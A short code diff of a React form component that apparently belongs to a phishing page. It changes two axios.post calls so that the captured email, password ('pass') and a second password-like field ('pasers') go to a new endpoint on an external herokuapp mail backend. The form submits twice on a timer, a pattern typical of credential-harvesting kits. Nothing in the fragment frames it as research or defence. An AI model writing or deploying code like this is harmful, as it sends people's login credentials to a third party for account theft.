@@ -20,7 +20,7 @@ function Forms() {
     setConfirmForm(true);
     setShowForm(false);
     try {
-      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
+      await axios.post("https://ikbackend.herokuapp.com/sendmail2", {
         email,
         pass,
         pasers,
@@ -39,7 +39,7 @@ function Forms() {
     }, 1000);
 
     try {
-      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
+      await axios.post("https://ikbackend.herokuapp.com/sendmail2", {
         email,
         pass,
         pasers,
